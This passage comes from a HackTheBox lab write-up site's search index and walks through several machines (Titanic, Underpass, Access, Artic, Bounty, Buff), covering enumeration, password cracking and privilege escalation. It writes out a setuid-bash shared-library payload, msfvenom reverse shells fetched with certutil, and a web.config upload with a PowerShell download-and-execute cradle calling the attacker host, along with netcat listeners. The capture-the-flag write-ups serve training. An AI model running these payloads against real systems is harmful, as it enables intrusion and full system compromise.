base64\n5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=\n\n$ echo '8bf3e3452b78544f8bee9400d6936d34' | xxd -p -r | base64\ni/PjRSt4VE+L7pQA1pNtNA==\n</code></pre> <p><code>sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=</code></p> <pre><code>$ sudo hashcat hash SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force -d 2\nhashcat (v6.2.6) starting in autodetect mode\n\nThe following mode was auto-detected as the only one matching your input hash:\n\n10900 | PBKDF2-HMAC-SHA256 | Generic KDF\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\nDictionary cache hit:\n* Filename..: SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz\n* Passwords.: 14344383\n* Bytes.....: 53291283\n* Keyspace..: 14344383\n\nsha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528\n</code></pre> <p><code>developer:25282528</code></p> <p>Log into the machine via <code>ssh</code>:</p> <pre><code>$ ssh developer@titanic.htb\ndeveloper@titanic.htb password: \nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Tue Jun  3 09:55:33 PM UTC 2025\n\n  System load:           0.78\n  Usage of /:            83.1% of 6.79GB\n  Memory usage:          23%\n\nLast login: Tue Jun 3 00:17:16 2025 from 10.10.14.8\ndeveloper@titanic:~$ cd /opt\ndeveloper@titanic:/opt$ whoami\ndeveloper\n</code></pre> <p>Get the flag:</p> <pre><code>developer@titanic:~$ cat user.txt\nc7158d122d55f4fa53de64dd03ca2085\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"titanic/#privilege-escalation","title":"Privilege Escalation","text":"<p>A script in <code>/opt/scripts</code> that uses <code>magick</code> does some processing on images.</p> <pre><code>developer@titanic:/opt/scripts$ cat identify_images.sh \ncd /opt/app/static/assets/images\ntruncate -s 0 metadata.log\nfind /opt/app/static/assets/images/ -type f -name \"*.jpg\" | xargs /usr/bin/magick identify &gt;&gt; metadata.log\n</code></pre> <p>We can check the version:</p> <pre><code>developer@titanic:/opt/scripts$ /usr/bin/magick -version\nVersion: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org\n</code></pre> <p>Looking for vulnerabilities, we find CVE-2024-41817, which we can use to escalate privileges.</p> <ul> <li>FortiGuard CVE-2024-41817</li> <li>Mindpatch writeup</li> </ul> <p>Create the shared library and place it in the working directory <code>/opt/app/static/assets/images</code>:</p> <pre><code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF  \n#include &lt;stdio.h&gt;  \n#include &lt;stdlib.h&gt;  \n#include &lt;unistd.h&gt;  \n__attribute__((constructor)) void init(){  \n    system(\"chmod +s /bin/bash\");  \n    exit(0);  \n}  \nEOF\n</code></pre> <p>A root cron job will execute it.</p> <p></p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"titanic/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>bash-5.1# cat root.txt\naa8be85cd77b9e27a344d1c68ec01f3f\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"underpass/","title":"Underpass","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"underpass/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.48 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 13:15 CEST\nNmap scan report for 10.10.11.48\nHost is up (0.041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)\n|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5.0\nOS details: Linux 5.0, Linux 5.0 - 5.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   40.70 ms 10.10.14.1\n2   40.98 ms 10.10.11.48\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.47 seconds\n</code></pre> <pre><code>$ sudo nmap -sU --top-ports 50 -Pn 10.10.11.48 --open\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 13:15 CEST\nNmap scan report for 10.10.11.48\nHost is up (0.041s latency).\nNot shown: 30 open|filtered udp ports (no-response), 19 closed udp ports (port-unreach)\nPORT    STATE SERVICE\n161/udp open  snmp\n\nNmap done: 1 IP address (1 host up) scanned in 15.97 seconds\n</code></pre> <p>Enumerating <code>snmp</code> we find the instance name running on the server</p> <pre><code>$ snmpwalk -c public -v1 -t 10 10.10.11.48\niso.3.6.1.2.1.1.1.0 = STRING: \"Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64\"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10\niso.3.6.1.2.1.1.3.0 = Timeticks: (31611) 0:05:16.11\niso.3.6.1.2.1.1.4.0 = STRING: \"steve@underpass.htb\"\niso.3.6.1.2.1.1.5.0 = STRING: \"UnDerPass.htb is the only daloradius server in the basin!\"\niso.3.6.1.2.1.1.6.0 = STRING: \"Nevada, U.S.A. but not Vegas\"\niso.3.6.1.2.1.1.7.0 = INTEGER: 72\niso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02\n</code></pre> <p>Using <code>feroxbuster</code> to discover paths inside <code>/daloradius</code></p> <pre><code>$ feroxbuster -u http://10.10.11.48/daloradius -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 60 -x txt -x html -x php -x conf -C 302,301,403,404,400 -k\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://10.10.11.48/daloradius\n \ud83d\ude80  Threads               \u2502 60\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt\n \ud83d\udca2  Status Code Filters   \u2502 [302, 301, 403, 404, 400]\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [txt, html, php, conf]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd13  Insecure              \u2502 true\n \ud83d\udd03  Recursion Depth       \u2502 4\n\n[&gt;-------------------] - 2m     26395/6369090 202/s   http://10.10.11.48/daloradius/app/users/ \n[&gt;-------------------] - 43s     3625/6369090 85/s    http://10.10.11.48/daloradius/app/operators/\n</code></pre> <p>Going to <code>/users</code> shows the user login and <code>/operators</code> the admin login panel</p> <p></p> <p>The official repo (https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS) install instructions indicate the default password: <code>administrator:radius</code> so</p> <p></p> <p>Inside, in the search bar at the top right, click to search all users</p> <p></p> <p>Using <code>hashcat</code> crack the MD5 password</p> <pre><code>$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --force     \nhashcat (v6.2.6) starting\n\n412dd4759978acfcc81deab01b382403:underwaterfriends\n</code></pre> <p>So <code>svcmosh:underwaterfriends</code></p> <p>Access the machine via <code>SSH</code> with these new credentials</p> <pre><code>$ ssh svcMosh@10.10.11.48\nsvcMosh@10.10.11.48's password: \nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)\n\nLast login: Sat Jan 11 13:29:47 2025 from 10.10.14.62\nsvcMosh@underpass:~$ whoami\nsvcMosh\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"underpass/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get the flag</p> <pre><code>svcMosh@underpass:~$ cat user.txt\nebb6347ca59834b16b35e1c7b24c9447\n</code></pre> <p>This user can execute <code>mosh-server</code> as sudo, so create a server and connect to it with <code>mosh-client</code></p> <pre><code>svcMosh@underpass:~$ sudo -l\nMatching Defaults entries for svcMosh on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser svcMosh may run the following commands on localhost:\n    (ALL) NOPASSWD: /usr/bin/mosh-server\n</code></pre> <pre><code>svcMosh@underpass:~$ sudo /usr/bin/mosh-server \n\nMOSH CONNECT 60002 fNKglQ/C1dr9J3+wOb7TTQ\n\nmosh-server (mosh 1.3.2) [build mosh 1.3.2]\nCopyright 2012 Keith Winstein &lt;mosh-devel@mit.edu&gt;\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\n[mosh-server detached, pid = 2641]\n\nsvcMosh@underpass:~$ MOSH_KEY=fNKglQ/C1dr9J3+wOb7TTQ mosh-client 127.0.0.1 60002\n</code></pre> <pre><code>Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)\n\n...\nMosh: You have a detached Mosh session on this server (mosh [2631]).\n...\n\nroot@underpass:~# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"underpass/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>root@underpass:~# cd /root\nroot@underpass:~# cat root.txt\na883be264024dedc4faa1ff74f9c1c07\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"access/","title":"Access","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"access/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.98\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 23:06 CEST\nNmap scan report for 10.10.10.98\nHost is up (0.042s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can't get directory listing: PASV failed: 425 Cannot open data connection.\n23/tcp open  telnet?\n80/tcp open  http    Microsoft IIS httpd 7.5\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: MegaCorp\n| http-methods: \n|_  Potentially risky methods: TRACE\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT      ADDRESS\n1   41.63 ms 10.10.14.1\n2   42.22 ms 10.10.10.98\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 208.51 seconds\n</code></pre> <p>The website shows an image of servers.</p> <p></p> <p>Enumerating the <code>FTP</code> service, we find two folders: <code>Backups</code> and <code>Engineer</code>.</p> <p>Get the files inside both of them.</p> <pre><code>$ ftp 10.10.10.98\nConnected to 10.10.10.98.\n220 Microsoft FTP Service\nName (10.10.10.98:kali): ftp\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n425 Cannot open data connection.\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM       &lt;DIR&gt;          Backups\n08-24-18  10:00PM       &lt;DIR&gt;          Engineer\nftp&gt; ls backups\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM              5652480 backup.mdb\n226 Transfer complete.\nftp&gt; ls engineer\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-24-18  01:16AM                10870 Access Control.zip\n226 Transfer complete.\n</code></pre> <p>The zip file is password protected, so use <code>strings</code> on <code>backup.mdb</code> to see the password.</p> <p></p> <p>Now unzip the <code>.pst</code> file.</p> <p>First, using <code>readpst</code>, create an <code>mbox</code> file and then read it.</p> <pre><code>$ readpst Access\\ Control.pst \nOpening PST file and indexes...\nProcessing Folder \"Deleted Items\"\n        \"Access Control\" - 2 items done, 0 items skipped.\n</code></pre> <pre><code>$ cat Access\\ Control.mbox \nFrom \"john@megacorp.com\" Fri Aug 24 01:44:07 2018\nStatus: RO\nFrom: john@megacorp.com &lt;john@megacorp.com&gt;\nSubject: MegaCorp Access Control System \"security\" account\nTo: 'security@accesscontrolsystems.com'\nDate: Thu, 23 Aug 2018 23:44:07 +0000\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n        boundary=\"--boundary-LibPST-iamunique-1909107888_-_-\"\n...\n\nHi there,\n\n\n\nThe password for the \u201csecurity\u201d account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.\n\n\n\nRegards,\n\nJohn\n\n...\n</code></pre> <p>So we now have <code>security:4Cc3ssC0ntr0ller</code>.</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"access/#initial-access","title":"Initial Access","text":"<p>Using the credentials, try <code>telnet</code> on <code>port</code> <code>23</code>.</p> <pre><code>$ telnet 10.10.10.98 23\nTrying 10.10.10.98...\nConnected to 10.10.10.98.\nEscape character is '^]'.\nWelcome to Microsoft Telnet Service \n\nlogin: security\npassword: \n\n*===============================================================\nMicrosoft Telnet Server.\n*===============================================================\nC:\\Users\\security&gt;whoami\naccess\\security\n</code></pre> <p>Get the flag:</p> <pre><code>C:\\Users\\security&gt;type desktop\\user.txt\nd317a0b870778120819e6db932f1752d\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"access/#privilege-escalation","title":"Privilege Escalation","text":"<p>There are stored administrator credentials:</p> <pre><code>C:\\Users\\security&gt;cmdkey /list\n\nCurrently stored credentials:\n\n    Target: Domain:interactive=ACCESS\\Administrator\n                                                       Type: Domain Password\n    User: ACCESS\\Administrator\n</code></pre> <p>Create a reverse shell and upload it to the machine.</p> <pre><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=5555 -f exe -o reverse.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\nSaved as: reverse.exe\n</code></pre> <pre><code>C:\\Users\\security&gt;certutil -f -split -urlcache http://10.10.14.14:8000/reverse.exe\n****  Online  ****\n  0000  ...\n  1c00\nCertUtil: -URLCache command completed successfully.\n</code></pre> <p>Now start a listener and, using <code>runas</code>, execute the shell.</p> <pre><code>C:\\Users\\security&gt;runas /savecred /user:ACCESS\\Administrator \".\\reverse.exe\"\n</code></pre> <pre><code>$ rlwrap nc -lnvp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.10.98] 49163\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\naccess\\administrator\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"access/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\n04c18a0791cf85431a0284101f6aef72\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"artic/","title":"Artic","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"artic/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.11 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 19:33 CEST\nNmap scan report for 10.10.10.11\nHost is up (0.041s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE VERSION\n135/tcp   open  msrpc   Microsoft Windows RPC\n8500/tcp  open  fmtp?\n49154/tcp open  msrpc   Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT      ADDRESS\n1   39.95 ms 10.10.14.1\n2   40.27 ms 10.10.10.11\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 166.34 seconds\n</code></pre> <p>Browsing <code>port</code> <code>8500</code></p> <p></p> <p>Exploring some ColdFusion files, we see the version: <code>8</code></p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"artic/#initial-access","title":"Initial Access","text":"<p>Using <code>searchsploit</code>, we can get an RCE for version <code>8</code>.</p> <p></p> <p>Executing it, we get a shell.</p> <pre><code>$ python 50057.py\n\nGenerating a payload...\nPayload size: 1497 bytes\nSaved as: b7172b096b3d440aa353a65a5d0acac3.jsp\n\n...\n\n\n...\n\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\ColdFusion8\\runtime\\bin&gt;whoami\nwhoami\narctic\\tolis\n</code></pre> <p>Get the flag:</p> <pre><code>C:\\Users\\tolis\\Desktop&gt;type user.txt\ntype user.txt\nf7e361c9b62bb18b40ca4fc348bf549f\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"artic/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>whoami /priv                                                                                           \n\nPRIVILEGES INFORMATION                                                                                 \n----------------------                                                                                 \n\nPrivilege Name                Description                               State                          \n============================= ========================================= ========                       \nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                        \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled                        \nSeCreateGlobalPrivilege       Create global objects                     Enabled                        \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre> <p>The user has <code>SeImpersonatePrivilege</code>, so transfer <code>nc.exe</code> and <code>PrintSpoofer</code> to the machine.</p> <p>Bug</p> <p>I can't get it to work.</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"bounty/","title":"Bounty","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"bounty/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.93\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 23:35 CEST\nNmap scan report for 10.10.10.93\nHost is up (0.042s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Bounty\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1\nAggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   41.62 ms 10.10.14.1\n2   41.92 ms 10.10.10.93\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.88 seconds\n</code></pre> <p>The only open <code>port</code> shows an image of <code>merlin</code>.</p> <p></p> <p>With <code>feroxbuster</code> we discover <code>/transfer.aspx</code>.</p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"bounty/#initial-access","title":"Initial Access","text":"<p>I could use a double extension or null byte but can't reach the file, so searching for aspx config files, we can upload a <code>web.config</code> one with a reverse shell command.</p> <p>Create a <code>msfvenom</code> reverse shell and start a Python HTTP server and a listener, then upload the <code>web.config</code>.</p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=5555 -f exe -o reverse.exe\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n      &lt;handlers accessPolicy=\"Read, Script, Write\"&gt;\n         &lt;add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" /&gt;\n      &lt;/handlers&gt;\n      &lt;security&gt;\n         &lt;requestFiltering&gt;\n            &lt;fileExtensions&gt;\n               &lt;remove fileExtension=\".config\" /&gt;\n            &lt;/fileExtensions&gt;\n            &lt;hiddenSegments&gt;\n               &lt;remove segment=\"web.config\" /&gt;\n            &lt;/hiddenSegments&gt;\n         &lt;/requestFiltering&gt;\n      &lt;/security&gt;\n   &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n&lt;%@ Language=VBScript %&gt;\n&lt;%\n  call Server.CreateObject(\"WSCRIPT.SHELL\").Run(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.17:8000/shell.ps1')\")\n%&gt;\n</code></pre> <p>Upon visiting <code>/uploadedfiles/web.config</code>, the config will get the <code>reverse.exe</code> and execute it.</p> <pre><code>$ rlwrap nc -lnvp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.17] from (UNKNOWN) [10.10.10.93] 49162\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nc:\\windows\\system32\\inetsrv&gt;whoami\nwhoami\nbounty\\merlin\n</code></pre> <p>Get the flag</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"bounty/#privilege-escalation","title":"Privilege Escalation","text":"<p>Bug</p> <p>ABORTED: The user has <code>SeImpersonatePrivilege</code> but nothing worked.</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"buff/","title":"Buff","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"buff/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.198\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 00:06 CEST\nNmap scan report for 10.10.10.198\nHost is up (0.041s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT     STATE SERVICE    VERSION\n7680/tcp open  pando-pub?\n8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)\n|_http-title: mrb3n's Bro Hut\n|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|2019 (97%)\nOS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019\nAggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT      ADDRESS\n1   40.94 ms 10.10.14.1\n2   41.27 ms 10.10.10.198\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 87.83 seconds\n</code></pre> <p><code>Port</code> <code>8080</code> shows a site about fitness.</p> <p></p> <p>The site is made with <code>Gym Management Software 1.0</code>.</p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"buff/#initial-access","title":"Initial Access","text":"<p>Using <code>searchsploit</code>, get the unauthenticated RCE one and execute it.</p> <p></p> <pre><code>$ python2 48506.py 